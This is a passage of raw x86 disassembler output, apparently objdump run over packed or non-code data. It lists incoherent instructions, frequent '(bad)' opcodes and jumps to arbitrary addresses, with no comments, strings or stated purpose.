  425783:	inc    edi
  425784:	mov    esp,0xd8736792
  425789:	iret   
  42578a:	shl    DWORD PTR [ecx+0x2],1
  42578d:	lahf   
  42578e:	jbe    0x42575a
  425790:	lea    edi,[edx]
  425792:	retf   
  425793:	xchg   ebp,eax
  425794:	inc    edx
  425795:	(bad)  
  425796:	sti    
  425797:	sar    bl,cl
  425799:	dec    eax
  42579a:	loop   0x4257bd
  42579c:	cmc    
  42579d:	jb     0x42579f
	...
  4257a7:	add    BYTE PTR [eax],al
  4257a9:	add    BYTE PTR [edx+0x43],cl
  4257ac:	push   ebp
  4257ad:	push   esi
  4257ae:	pop    ebp
  4257af:	push   esi
  4257b0:	dec    ebx
  4257b1:	pop    edi
  4257b2:	idiv   bl
  4257b4:	(bad)
  4257b8:	jl     0x4257a1
  4257ba:	adc    ch,ah
  4257bc:	add    DWORD PTR [eax],eax
  4257be:	jl     0x4257c6
  4257c0:	add    BYTE PTR [eax],al
  4257c2:	xor    eax,0x2ba9782f
  4257c7:	mov    al,0x54
  4257c9:	mov    dl,0x1e
  4257cb:	inc    eax
  4257cc:	or     esp,DWORD PTR [ebp+0x73]
  4257cf:	add    cl,BYTE PTR [ebx+0x36090989]
  4257d5:	push   eax
  4257d6:	cmp    eax,0x3852de99
  4257db:	jns    0x425832
  4257dd:	mov    edi,0x9ffbdad8
  4257e2:	jmp    0x8daa00dd
  4257e7:	out    0xf0,eax
  4257e9:	mov    eax,ds:0xf4ac3298
  4257ee:	repnz hlt 
  4257f0:	mov    ds:0xcccac982,eax
  4257f5:	or     dl,BYTE PTR [edi+0x7a120bdc]
  4257fb:	(bad)  
  4257fc:	push   edx
  4257fd:	sub    al,0xcb
  4257ff:	bsf    ecx,DWORD PTR [ebp+0x416909ba]
  425806:	aad    0xa7
  425808:	xor    ebp,DWORD PTR [ebp+0x26]
  42580b:	mov    cl,0x7b
  42580d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42580e:	test   BYTE PTR [edi-0x9db52ac],0xd5
  425815:	call   0x99c4909b
  42581a:	cmp    bl,al
  42581c:	or     bh,BYTE PTR [eax+0x35]
  42581f:	push   eax
  425820:	and    cl,ch
  425822:	cmp    eax,0xa5efd3e0
  425827:	loope  0x4258a6
  425829:	sub    dh,BYTE PTR [ebx+0x76496765]
  42582f:	test   BYTE PTR [esi-0x18],ah
  425832:	adc    eax,0x7b
  425835:	jle    0x4258a2
  425837:	inc    esp
  425838:	int3   
  425839:	out    dx,eax
  42583a:	adc    eax,0xa34f7428
  42583f:	mov    eax,ds:0x307b629e
  425844:	and    dl,BYTE PTR [esi-0x3]
  425847:	sub    ah,ah
  425849:	cmp    al,0x1e
  42584b:	popf   
  42584c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42584d:	in     eax,0x41
  42584f:	mov    cl,0xd4
  425851:	jo     0x425811
  425853:	pop    edi
  425854:	lahf   
  425855:	inc    eax
  425856:	imul   esp,DWORD PTR [ecx+ebx*1+0x633c3d1],0xffffff85
  42585e:	shr    BYTE PTR [ebx],cl
  425860:	loopne 0x42584b
  425862:	arpl   WORD PTR [ebp+0x3a],dx
  425865:	and    edx,DWORD PTR [esi-0x3a]
  425868:	push   ecx
  425869:	(bad)  
  42586a:	fpatan 
  42586c:	out    0x95,al
  42586e:	sar    DWORD PTR [edx+0x466b01ac],1
  425874:	cld    
  425875:	jmp    0x42587c
  425877:	xchg   ebx,eax
  425878:	fldcw  WORD PTR [edi]
  42587a:	dec    esi
  42587b:	or     BYTE PTR [ebx+0x2c],bl
  42587e:	push   cs
  42587f:	icebp  
  425880:	pop    edi
  425881:	mov    ch,BYTE PTR [eax]
  425883:	push   ecx
  425884:	pop    ds
  425885:	mov    ebx,0xd3983176
  42588a:	std    
  42588b:	js     0x425840
  42588d:	push   DWORD PTR ss:[edi-0x718bbaa4]
  425894:	lods   al,BYTE PTR ds:[esi]
  425895:	push   ds
  425896:	jne    0x42584a
  425898:	xor    dh,BYTE PTR [ebx-0x65ee2ecf]
  42589e:	jmp    0x425885
  4258a0:	jnp    0x425903
  4258a2:	ins    DWORD PTR es:[edi],dx
  4258a3:	test   BYTE PTR [ecx-0x6],0x62
  4258a7:	mov    bh,0x74
  4258a9:	sub    edx,DWORD PTR [eax-0x45]
  4258ac:	fiadd  WORD PTR [esi]
  4258ae:	pop    esp
  4258af:	mov    ah,0xf8
  4258b1:	jo     0x4258ef
  4258b3:	mov    DWORD PTR [edi+0x5f],edx
  4258b6:	stos   DWORD PTR es:[edi],eax
  4258b7:	outs   dx,BYTE PTR ds:[esi]
  4258b8:	mov    eax,0x39af1e9d
  4258bd:	inc    ebp
  4258be:	add    BYTE PTR [esi],0x38
  4258c1:	or     cl,BYTE PTR [esi+0x20968df4]
  4258c7:	in     eax,dx
  4258c8:	jg     0x425872
  4258ca:	add    eax,0xfde8238d
  4258cf:	jae    0x42589d
  4258d1:	ret    
  4258d2:	inc    ecx
  4258d3:	push   es
  4258d4:	sub    al,0xa1
  4258d6:	or     DWORD PTR ds:[edx+0x567f02ed],esp
  4258dd:	jmp    edx
  4258df:	jo     0x4258f9
  4258e1:	pop    es
  4258e2:	mov    ds:0x547083df,al
  4258e7:	xchg   ebx,eax
  4258e8:	jmp    0x8509d234
  4258ed:	dec    edi
  4258ee:	mov    al,0xfb
  4258f0:	pop    es
  4258f1:	outs   dx,DWORD PTR ds:[esi]
  4258f2:	rol    BYTE PTR [ecx+0x76a5848f],cl
  4258f8:	cwde   
  4258f9:	(bad)  
  4258fc:	adc    DWORD PTR [esi+esi*8],ecx
  4258ff:	mov    esi,0x3310f181
  425904:	retf   0x13e2
  425907:	ret    0x3cc0
  42590a:	stos   DWORD PTR es:[edi],eax
  42590b:	sbb    bl,BYTE PTR [eax+0xdf63be5]
  425911:	mov    al,0x48
  425913:	jp     0x425922
  425915:	dec    esp
  425916:	mov    ch,0x24
  425918:	inc    ebx
  425919:	jecxz  0x42598b
  42591b:	xchg   esi,eax
  42591c:	mov    ah,0xd
  42591e:	xor    edx,edx
  425920:	stos   DWORD PTR es:[edi],eax
  425921:	ror    DWORD PTR [eax+0x62],1
  425924:	xchg   ebx,eax
  425925:	dec    edi
  425926:	cmp    ah,ah
  425928:	stc    
  425929:	sbb    DWORD PTR [edi],ebp
  42592b:	xor    BYTE PTR [ebp-0x35],bh
  42592e:	aam    0x3e
  425930:	push   es
  425931:	mov    ds:0xcff609e5,al
  425936:	xchg   ecx,eax
  425937:	xor    al,0xfe
  425939:	popa   
  42593a:	and    edi,edx
  42593c:	imul   ecx,DWORD PTR [edx-0x7d8ca351],0x6
  425943:	xor    DWORD PTR [esi+0x4e2674f5],edi
  425949:	sub    al,0x7c
  42594b:	daa    
  42594c:	xchg   ebx,eax
  42594d:	mov    al,0x5b
  42594f:	test   BYTE PTR ds:0xab1f8fa9,0xc7
  425956:	mov    edi,0xbeb7fc45
  42595b:	repnz out 0xf6,eax
  42595e:	test   BYTE PTR [edx+0x6],ch
  425961:	imul   ebx,edi,0x70
  425964:	pop    edi
  425965:	inc    ebp
  425966:	jno    0x425958
  425968:	mov    esp,0xcfa31479
  42596d:	retf   
  42596e:	mov    ch,BYTE PTR ds:0x5be6c5d1
  425974:	fistp  WORD PTR [edi-0x71695808]
  42597a:	xor    DWORD PTR [ecx-0x5c6d26aa],ebp
  425980:	js     0x425960
  425982:	in     al,dx
  425983:	popf   
  425984:	ja     0x4259ca
  425986:	sbb    dh,BYTE PTR [edi-0x521145be]
  42598c:	sub    al,0xa2
  42598e:	inc    esp
  42598f:	lock dec ebx
  425991:	outs   dx,BYTE PTR ds:[esi]
  425992:	pop    ecx
  425993:	ins    DWORD PTR es:[edi],dx
  425994:	arpl   dx,sp
  425996:	sbb    esi,DWORD PTR [ebx+ecx*1-0x1a]
  42599a:	and    eax,ebx
  42599c:	test   BYTE PTR [eax-0x48d98e6f],0x0
  4259a3:	popf   
  4259a4:	je     0x425986
  4259a6:	mov    BYTE PTR [ecx+0x3188d424],al
  4259ac:	int    0x16
  4259ae:	out    0xd0,al
  4259b0:	xchg   DWORD PTR [ecx+0x3a0ad334],ebx
  4259b6:	inc    ecx
  4259b7:	loope  0x4259ad
  4259b9:	ja     0x4259e1
  4259bb:	xchg   esi,eax
  4259bc:	mov    esi,0xe767c735
  4259c1:	adc    esp,esp
  4259c3:	retf   
  4259c4:	cmp    al,0xca
  4259c6:	pusha  
  4259c7:	repz (bad) 
  4259c9:	mov    eax,ds:0x441aef0b
  4259ce:	push   es
  4259cf:	je     0x4259cd
  4259d1:	(bad)  
  4259d2:	not    ecx
  4259d4:	and    BYTE PTR [ecx-0x24d61a56],bl
  4259da:	imul   edx,DWORD PTR [ebp+0x51d5dab1],0x76
  4259e1:	inc    esi
  4259e2:	inc    edx
  4259e3:	push   0x259ace92
  4259e8:	sbb    BYTE PTR [edx-0x1900f70a],bh
  4259ee:	lock test BYTE PTR [eax-0x7699e40b],bh
  4259f5:	cmc    
  4259f6:	mov    bl,0x42
  4259f8:	push   esp
  4259f9:	mov    ds:0xbd22c0df,al
  4259fe:	and    dl,BYTE PTR [esi+0x53]
  425a01:	or     cl,cl
  425a03:	dec    ebx
  425a04:	repnz popa 
  425a06:	(bad)  
  425a08:	add    esp,edi
  425a0a:	mov    eax,ds:0x8da602b2
  425a0f:	dec    edx
  425a10:	fnstenv [ecx+0x224ff54f]
  425a16:	lods   al,BYTE PTR ds:[esi]
  425a17:	iret   
  425a18:	jecxz  0x425a23
  425a1a:	jmp    0xb42f2ae9
  425a1f:	minps  xmm0,XMMWORD PTR cs:[eax-0x5a367662]
  425a27:	test   BYTE PTR [eax],dh
  425a29:	xchg   edx,eax
  425a2a:	sar    DWORD PTR [edi+0x45],0x2c
  425a2e:	hlt    
  425a2f:	test   BYTE PTR [ebp+0x2b932406],0x11
  425a36:	xchg   BYTE PTR [edi],bh
  425a38:	xor    ecx,DWORD PTR [ecx]
  425a3a:	hlt    
  425a3b:	aam    0x67
  425a3d:	fsub   st(6),st
  425a3f:	call   0x120fd553
  425a44:	mov    DWORD PTR [eax],ebp
  425a46:	dec    esp
  425a47:	adc    eax,0xe5e193d9
  425a4c:	popa   
  425a4d:	repnz (bad) 
  425a4f:	std    
  425a50:	shl    esp,0x0
  425a53:	xchg   DWORD PTR [ebx-0x3b],edi
  425a56:	pusha  
  425a57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a58:	icebp  
  425a59:	not    BYTE PTR [ecx+0x7d]
  425a5c:	jae    0x425a46
  425a5e:	inc    ebx
  425a5f:	mov    ebx,0xe01277c8
  425a64:	push   ebp
  425a65:	dec    edi
  425a66:	jae    0x425a26
  425a68:	pop    ds
  425a69:	les    edx,FWORD PTR [ebp-0x38f917b]
  425a6f:	inc    edi
  425a70:	inc    edx
  425a71:	out    dx,eax
  425a72:	stc    
  425a73:	and    eax,0x301d0bb9
  425a78:	or     al,0x91
  425a7a:	jp     0x425a3a
  425a7c:	pop    ss
  425a7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a7e:	cs pusha 
  425a80:	jns    0x425ae3
  425a82:	daa    
  425a83:	xchg   ecx,eax
  425a84:	je     0x425aca
  425a86:	mov    eax,ds:0xf66be9f1
  425a8b:	dec    ecx
  425a8c:	jmp    0x425af5
  425a8e:	xchg   ebp,eax
  425a8f:	es xchg ebp,eax
  425a91:	fs xchg ecx,eax
  425a93:	inc    eax
  425a94:	xor    ebp,ebp
  425a96:	arpl   WORD PTR [edi+edx*2-0x7b205d49],bx
  425a9d:	lea    edx,[edx]
  425a9f:	sub    al,0x76
  425aa1:	mov    cl,0xc8
  425aa3:	inc    edi
  425aa4:	(bad)  
  425aa6:	mov    ebx,0xe82a2ac8
  425aab:	mov    eax,ds:0x9a8352ba
  425ab0:	xchg   dl,cl
  425ab2:	push   esp
  425ab3:	gs mov ch,0x19
  425ab6:	xchg   edx,eax
  425ab7:	push   edx
  425ab8:	mov    dh,0xdc
  425aba:	push   ebx
  425abb:	sub    ecx,edi
  425abd:	call   0x391e:0x77636632
  425ac4:	add    dl,BYTE PTR [ecx+0x4816570a]
  425aca:	sub    esi,esi
  425acc:	sbb    ecx,eax
  425ace:	(bad)  
  425acf:	push   edi
  425ad0:	retf   0x5bc7
  425ad3:	dec    ebx
  425ad4:	push   eax
  425ad5:	je     0x425b41
  425ad7:	fwait
  425ad8:	js     0x425a7c
  425ada:	sbb    DWORD PTR [edi-0x66],ebx
  425add:	out    0x2b,al
  425adf:	enter  0xa1ec,0xa0
  425ae3:	push   esp
  425ae4:	scas   al,BYTE PTR es:[edi]
  425ae5:	and    al,0x2d
  425ae7:	into   
  425ae8:	std    
  425ae9:	test   eax,0x3713bf26
  425aee:	mov    ss,WORD PTR [ebx-0x5f]
  425af1:	and    al,0x9
  425af3:	jmp    0x425b50
  425af5:	sub    bh,bh
  425af7:	ja     0x425b36
  425af9:	dec    esp
  425afa:	hlt    
  425afb:	push   ecx
  425afc:	ret    
  425afd:	sbb    cl,BYTE PTR [edi+eiz*1+0x62370dc0]
  425b04:	and    eax,0xb4a93860
  425b09:	std    
  425b0a:	mov    ecx,0x3f7fa7dd
  425b0f:	dec    edi
  425b10:	imul   edx,DWORD PTR [edx],0x9a9afc05
  425b16:	out    dx,al
  425b17:	retf   0x7cc
  425b1a:	mov    fs,WORD PTR [eax-0x4a068d46]
  425b20:	inc    DWORD PTR [eax-0x5287eece]
  425b26:	xor    BYTE PTR [ebx+0x2abc66eb],dh
  425b2c:	cs lock xchg esp,eax
  425b2f:	xchg   ecx,eax
  425b30:	cmp    BYTE PTR [ecx-0xd2ce902],al
  425b36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b37:	mov    bh,0x5e
  425b39:	call   0x6b5586f0
  425b3e:	cli    
  425b3f:	arpl   WORD PTR [ebx-0x11],dx
  425b42:	je     0x425b47
  425b44:	adc    edx,DWORD PTR [edi+0x6684a1ec]
  425b4a:	jmp    0x425af0
  425b4c:	call   0x43c01a03
  425b51:	stos   DWORD PTR es:[edi],eax
  425b52:	pop    esi
  425b53:	xor    esp,0xffffffc9
  425b56:	xchg   edx,eax
  425b57:	nop
  425b58:	jmp    0x425adf
  425b5a:	ds fwait
  425b5c:	dec    ebx
  425b5d:	pop    esp
  425b5e:	repnz xchg al,dh
  425b61:	enter  0x88ad,0xf9
  425b65:	inc    edx
  425b66:	aam    0x11
  425b68:	cmc    
  425b69:	add    al,0x40
  425b6b:	lods   al,BYTE PTR ds:[esi]
  425b6c:	ss in  al,dx
  425b6e:	sub    bl,dl
  425b70:	adc    al,0x64
  425b72:	fsubp  st(5),st
  425b74:	pop    eax
  425b75:	call   0x8091:0xcf5bacb3
  425b7c:	add    ebp,edi
  425b7e:	mov    ss,WORD PTR [edx-0x57]
  425b81:	xor    esi,DWORD PTR [edi+ebp*8+0x58]
  425b85:	jnp    0x425bdd
  425b87:	(bad)  
  425b88:	jecxz  0x425b38
  425b8a:	sti    
  425b8b:	addr16 aad 0xa8
  425b8e:	add    edi,DWORD PTR [edx+0x5dbe1909]
  425b94:	(bad)  
  425b96:	loop   0x425bf7
  425b98:	aaa    
  425b99:	popa   
  425b9a:	outs   dx,BYTE PTR ds:[esi]
  425b9b:	scas   eax,DWORD PTR es:[edi]
  425b9c:	cmp    eax,0x3028a8c9
  425ba1:	jmp    0xd908a658
  425ba6:	sar    DWORD PTR [ecx+0xeea539b],1
  425bac:	or     DWORD PTR [eax+0x3c5631d4],edi
  425bb2:	pop    esp
  425bb3:	outs   dx,DWORD PTR ds:[esi]
  425bb4:	loop   0x425b7e
  425bb6:	sub    edx,DWORD PTR [esi+0x4b]
  425bb9:	enter  0xa727,0x49
  425bbd:	push   ds
  425bbe:	out    0x52,eax
  425bc0:	lock out dx,al
  425bc2:	sub    edi,DWORD PTR [eax-0x6927abd1]
  425bc8:	cmp    eax,0xa6f6c9b1
  425bcd:	pop    ss
  425bce:	push   esp
  425bcf:	cmp    al,0x1c
  425bd1:	jbe    0x425c07
  425bd3:	pop    es
  425bd4:	pop    ss
  425bd5:	cmp    esi,DWORD PTR [edi+0x75aaeafc]
  425bdb:	cli    
  425bdc:	aas    
  425bdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425bde:	push   esi
  425bdf:	stos   DWORD PTR es:[edi],eax
  425be0:	sbb    al,0x7
  425be2:	mov    al,0xf1
  425be4:	sbb    DWORD PTR [eax-0x7eca7785],0x7
  425beb:	dec    esi
  425bec:	ficomp WORD PTR [ecx]
  425bee:	outs   dx,DWORD PTR ds:[esi]
  425bef:	(bad)  [ecx]
  425bf1:	mov    dl,BYTE PTR [ecx-0x6993e4eb]
  425bf7:	(bad)  
  425bf8:	and    al,0x57
  425bfa:	jne    0x425c52
  425bfc:	rcr    BYTE PTR [eax+0x69b23d3d],cl
  425c02:	lods   eax,DWORD PTR ds:[esi]
  425c03:	test   eax,0x9625aa9a
  425c08:	mov    ebp,0x1773d1e9
  425c0d:	bound  esp,QWORD PTR [ebx]
  425c0f:	mov    ebx,0xda3ef236
  425c14:	xchg   edi,eax
  425c15:	test   bh,dh
  425c17:	inc    esp
  425c18:	stos   DWORD PTR es:[edi],eax
  425c19:	sub    eax,0x28fcd2c
  425c1e:	rcr    DWORD PTR [esp+ecx*2-0x71864a93],cl
  425c25:	arpl   WORD PTR [edi+0x402d8198],si
  425c2b:	pop    esp
  425c2c:	js     0x425be8
  425c2e:	mov    eax,ds:0x743150cb
  425c33:	pusha  
  425c34:	test   al,0xe3
  425c36:	ja     0x425bfe
  425c38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c39:	push   esi
  425c3a:	xchg   ebx,eax
  425c3b:	jo     0x425bda
  425c3d:	mov    bl,0xc8
  425c3f:	xchg   ebp,eax
  425c40:	xchg   esi,eax
  425c41:	and    DWORD PTR [ebp-0x68052542],ecx
  425c47:	lds    ecx,FWORD PTR [ecx+edx*2]
  425c4a:	push   0x2d
  425c4c:	push   ecx
  425c4d:	sbb    al,0x32
  425c4f:	push   ds
  425c50:	and    DWORD PTR [eax-0x19c6c51c],ecx
  425c56:	cdq    
  425c57:	adc    eax,ebx
  425c59:	aas    
  425c5a:	xchg   edi,eax
  425c5b:	push   ebx
  425c5c:	jne    0x425c61
  425c5e:	and    al,0x5e
  425c61:	daa    
  425c62:	dec    esi
  425c63:	or     DWORD PTR [ecx-0x9b72678],edi
  425c69:	outs   dx,BYTE PTR ds:[esi]
  425c6a:	leave  
  425c6b:	and    eax,DWORD PTR [edx+esi*2-0x58963a7f]
  425c72:	inc    ebp
  425c73:	jnp    0x425c08
  425c75:	dec    ebp
  425c76:	jo     0x425c31
  425c78:	jne    0x425c58
  425c7a:	pop    esi
  425c7b:	div    BYTE PTR [esp+eax*2-0x7f99ed3b]
  425c82:	mov    bh,BYTE PTR [ebx-0x32]
  425c85:	pop    ds
  425c86:	in     al,dx
  425c87:	fnsave [eax]
  425c89:	fiadd  WORD PTR [ebp-0xf67c8ed]
  425c8f:	mov    bh,0x82
  425c91:	cmp    dh,BYTE PTR [ebp+0x27]
  425c94:	adc    ecx,DWORD PTR [eax+0x71]
  425c97:	loopne 0x425cf4
  425c99:	sub    cl,bh
  425c9b:	fs inc eax
  425c9d:	pop    edx
  425c9e:	mov    dl,0xb7
  425ca0:	(bad)  [edi+esi*2+0x14ba547f]
  425ca7:	dec    esp
  425ca8:	sbb    eax,0x3249a84b
  425cad:	xchg   BYTE PTR ds:0x8a601c6,cl
  425cb3:	fld    QWORD PTR [edi-0x58]
  425cb6:	ds ins BYTE PTR es:[edi],dx
  425cb8:	push   ds
  425cb9:	sahf   
  425cba:	adc    ecx,esp
  425cbc:	xor    ecx,eax
  425cbe:	inc    eax
  425cbf:	retf   
  425cc0:	test   eax,0xfd0ad682
  425cc5:	push   edi
  425cc6:	test   DWORD PTR [ebp-0x20ac5678],edi
  425ccc:	sub    edi,DWORD PTR [ecx+0x6d]
  425ccf:	cmp    DWORD PTR [edi+0x46d0738f],edx
  425cd5:	pop    esi
  425cd6:	dec    edx
  425cd7:	ds push esp
  425cd9:	push   0xffffffb3
  425cdb:	inc    esp
  425cdc:	push   ebx
  425cdd:	push   esp
  425cde:	sti    
  425cdf:	icebp  
  425ce0:	ret    0x9e6d
  425ce3:	mov    dh,0xf
  425ce5:	jbe    0x425d18
  425ce7:	stc    
  425ce8:	push   ebp
  425ce9:	jo     0x425d1f
  425ceb:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  425ced:	shl    DWORD PTR [ebx+0x34baa107],cl
  425cf3:	push   edx
  425cf4:	jl     0x425c80
  425cf6:	mov    ah,0x43
  425cf8:	test   al,0x49
  425cfa:	scas   eax,DWORD PTR es:[edi]
  425cfb:	std    
  425cfc:	out    0x16,eax
  425cfe:	sbb    DWORD PTR [edx+0x32],eax
  425d01:	loop   0x425d4f
  425d03:	and    DWORD PTR [ecx],0xffddf25c
  425d09:	(bad)  
  425d0a:	jbe    0x425cd4
  425d0c:	xchg   edx,eax
  425d0d:	add    eax,0x1e78bfb5
  425d12:	dec    edx
  425d13:	adc    DWORD PTR [esp+esi*4+0x250253e7],ebp
  425d1a:	ficom  DWORD PTR [edi+0x4733a79]
  425d20:	inc    edi
  425d21:	loop   0x425cb2
  425d23:	xchg   edi,eax
  425d24:	cmc    
  425d25:	jo     0x425d93
  425d27:	inc    esp
  425d28:	pop    ds
  425d29:	int    0x94
  425d2b:	adc    dl,BYTE PTR [ecx-0x1f]
  425d2e:	mov    bh,0x15
  425d30:	inc    ecx
  425d31:	shr    BYTE PTR [ebp+0x6c61736d],0xcf
  425d38:	fistp  QWORD PTR [eax]
  425d3a:	hlt    
  425d3b:	dec    esp
  425d3c:	mov    bh,0xe6
  425d3e:	push   ebx
  425d3f:	fwait
  425d40:	ror    edi,cl
  425d42:	sub    al,BYTE PTR [ebx+0x64]
  425d45:	not    ebp
  425d47:	pop    ecx
  425d48:	adc    ebp,eax
  425d4a:	sub    ebx,ebx
  425d4c:	dec    edi
  425d4d:	jns    0x425d61
  425d4f:	mov    al,0x45
  425d51:	mov    ebx,0xa7851804
  425d56:	dec    esi
  425d57:	push   0x3
  425d59:	popa   
  425d5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d5b:	lods   al,BYTE PTR ds:[esi]
  425d5c:	test   al,0xa
  425d5e:	push   ss
  425d5f:	add    dh,bh
  425d61:	fisttp QWORD PTR [eax-0x65a53b1d]
  425d67:	add    ah,BYTE PTR ds:0xea7b8b2
  425d6d:	xor    eax,DWORD PTR [ebx-0x45]
  425d70:	pushf  
  425d71:	xchg   DWORD PTR [ecx+edi*1+0x69da1f8d],ecx
  425d78:	jo     0x425def
  425d7a:	rcl    BYTE PTR fs:[ecx],0xb5
  425d7e:	adc    BYTE PTR [esi+0x52],cl
  425d81:	call   0x9425:0x610cdd74
  425d88:	hlt    
  425d89:	fild   DWORD PTR [esi+ebx*4+0x64237a83]
  425d90:	aas    
  425d91:	pop    eax
  425d92:	leave  
  425d93:	pop    eax
  425d94:	and    bl,BYTE PTR [edi-0x1d]
  425d97:	pushf  
  425d98:	cdq    
  425d99:	stc    
  425d9a:	stos   BYTE PTR es:[edi],al
  425d9b:	xchg   BYTE PTR [ebp-0x7c],dl
  425d9e:	jmp    0x8f7d93e6
  425da3:	push   ebp
  425da4:	add    DWORD PTR [ebx*2+0x3034ca08],ecx
  425dab:	push   esi
  425dac:	cmp    BYTE PTR [ebx+0x7f4e9f16],0xec
  425db3:	mov    ah,0x54
  425db5:	retf   0xc067
  425db8:	out    dx,al
  425db9:	xadd   DWORD PTR [edx+0x355347df],eax
  425dc0:	ret    0x96c0
  425dc3:	mov    ecx,0x5391ef96
  425dc8:	sbb    eax,0xacaca990
  425dcd:	cmp    DWORD PTR [eax],ebx
  425dcf:	in     al,dx
  425dd0:	sbb    al,0x3
  425dd2:	lds    edi,FWORD PTR [eax]
  425dd4:	hlt    
  425dd5:	cmp    eax,DWORD PTR [edi]
  425dd7:	arpl   WORD PTR [edi],bp
  425dd9:	cmp    al,0x8c
  425ddb:	pop    ebp
  425ddc:	fisub  WORD PTR [ebp-0x444cdfa6]
  425de2:	pop    bp
  425de4:	fisttp DWORD PTR [edx+0x2d794d41]
  425dea:	inc    edi
  425deb:	cmp    ecx,DWORD PTR [eax+0x559b5f84]
  425df1:	fstp   QWORD PTR [ebx-0x2a]
  425df4:	mov    ecx,0xad2df435
  425df9:	or     DWORD PTR [edi+edi*2],eax
  425dfc:	push   cs
  425dfd:	fs in  al,0x21
  425e00:	push   cs
  425e01:	add    ebx,DWORD PTR [ecx+edi*8-0x6a]
  425e05:	dec    edx
  425e06:	ins    DWORD PTR es:[edi],dx
  425e07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425e08:	pop    edi
  425e09:	cmc    
  425e0a:	sbb    DWORD PTR ds:0x97a810fe,eax
  425e10:	adc    DWORD PTR [ecx],edx
  425e12:	jno    0x425e69
  425e14:	xor    eax,0x723b4ca5
  425e19:	movhps QWORD PTR [ebx-0x39],xmm1
  425e1d:	and    al,0xdb
  425e1f:	jmp    0xc15a:0xb27c87f7
  425e26:	or     BYTE PTR ds:0x8f41af95,bl
  425e2c:	dec    eax
  425e2d:	in     eax,dx
  425e2e:	xor    BYTE PTR [edi+0x18],ah
  425e31:	imul   ebx,edi,0xffffffe9
  425e34:	and    dl,BYTE PTR [edx-0x4085281b]
  425e3a:	sub    al,0x2b
  425e3c:	les    esi,FWORD PTR [ebx]
	...
  425e4a:	inc    edx
  425e4b:	inc    esp
  425e4c:	inc    ebp
  425e4d:	pop    eax
  425e4e:	inc    edi
  425e4f:	pop    ecx
  425e50:	pop    edi
  425e51:	pop    esi
  425e52:	mov    bl,0x51
  425e54:	push   eax
  425e55:	mov    cl,0xd7
  425e57:	xor    al,BYTE PTR [edi+eax*4-0x74]
  425e5b:	jmp    0x425e5e
  425e5d:	add    BYTE PTR [esi+eax*1+0x0],bh
  425e61:	add    BYTE PTR [edi],ch
  425e63:	lods   al,BYTE PTR ds:[esi]
  425e64:	into   
  425e65:	bound  ebx,QWORD PTR [ebx+edx*8+0x46]
  425e69:	cmp    bl,BYTE PTR [edi-0x2c]
  425e6c:	xchg   edi,eax
  425e6d:	jnp    0x425e76
  425e6f:	xchg   ebp,eax
  425e70:	jmp    0xb4753949
  425e75:	rcl    ch,0xcf
  425e78:	(bad)  
  425e79:	pusha  
  425e7a:	stos   BYTE PTR es:[edi],al
  425e7b:	test   dl,dh
  425e7d:	mov    al,0x25
  425e7f:	iret   
  425e80:	(bad)  
  425e81:	pop    ds
  425e82:	pushf  
  425e83:	jmp    0x425e7a
  425e85:	mov    al,ds:0xf8b59ec0
  425e8a:	jmp    0x1ac2164
  425e8f:	pop    esp
  425e90:	inc    ecx
  425e91:	xor    DWORD PTR [ecx+0x6b],esp
  425e94:	jecxz  0x425ebe
  425e96:	mov    ah,0xd7
  425e98:	inc    ecx
  425e99:	sti    
  425e9a:	cmp    al,0x82
  425e9c:	mov    ebx,0x5df43cd3
  425ea1:	mov    ebx,0x7824223
  425ea6:	imul   ebx,DWORD PTR [esi-0x695768d6],0x44
  425ead:	xchg   DWORD PTR [edx-0x23],ebx
  425eb0:	gs mov ebx,0x1a766b4e
  425eb6:	aaa    
  425eb7:	test   DWORD PTR [edx+ebp*1-0x497b4435],ecx
  425ebe:	pop    eax
  425ebf:	mov    cl,0x98
  425ec1:	xlat   BYTE PTR ds:[ebx]
  425ec2:	fs sahf 
  425ec4:	lods   eax,DWORD PTR ds:[esi]
  425ec5:	inc    esi
  425ec6:	or     BYTE PTR [ebx],al
  425ec8:	and    ch,ah
  425eca:	sahf   
  425ecb:	test   BYTE PTR [ebx],bl
  425ecd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ece:	mul    edi
  425ed0:	sbb    edi,DWORD PTR [esi-0x1b]
  425ed3:	inc    esp
  425ed4:	pusha  
  425ed5:	pusha  
  425ed6:	mov    ds:0xe524709e,eax
  425edb:	push   ecx
  425edc:	mov    bl,0x96
  425ede:	mov    ds:0xcae308c1,eax
  425ee3:	(bad)  
  425ee4:	dec    ecx
  425ee5:	icebp  
  425ee6:	ss push ebp
  425ee8:	stos   DWORD PTR es:[edi],eax
  425ee9:	jle    0x425f2a
  425eeb:	dec    esp
  425eec:	repnz dec eax
  425eee:	dec    esp
  425eef:	retf   0xffe
  425ef2:	scas   eax,DWORD PTR es:[edi]
  425ef3:	cmp    al,al
  425ef5:	fiadd  DWORD PTR [ebp-0x3f]
  425ef8:	js     0x425f71
  425efa:	mov    bl,0xc5
  425efc:	(bad)  
  425efd:	adc    DWORD PTR [ebx+0x4e],edi
  425f00:	inc    edi
  425f01:	dec    edi
  425f02:	fcomp  QWORD PTR [eax-0x567ea007]
  425f08:	idiv   DWORD PTR [esi]
  425f0a:	retf   0xa6d9
  425f0d:	or     DWORD PTR [eax+0x5d1b1bf5],0xb5e2b3da
  425f17:	sub    ebx,DWORD PTR [ebx+0x68]
  425f1a:	ins    BYTE PTR es:[edi],dx
  425f1b:	outs   dx,BYTE PTR ds:[esi]
  425f1c:	push   ss
  425f1d:	ja     0x425f91
  425f1f:	in     al,0x93
  425f21:	jo     0x425f38
  425f23:	out    0x81,eax
  425f25:	xchg   ebx,eax
  425f26:	and    DWORD PTR [ebx+eiz*8-0x32],ecx
  425f2a:	jns    0x425f86
  425f2c:	and    BYTE PTR [eax],al
  425f2e:	sbb    DWORD PTR [edx],edx
  425f30:	adc    edi,DWORD PTR [edx-0x79]
  425f33:	ins    BYTE PTR es:[edi],dx
  425f34:	sub    al,0xcf
  425f36:	pop    ds
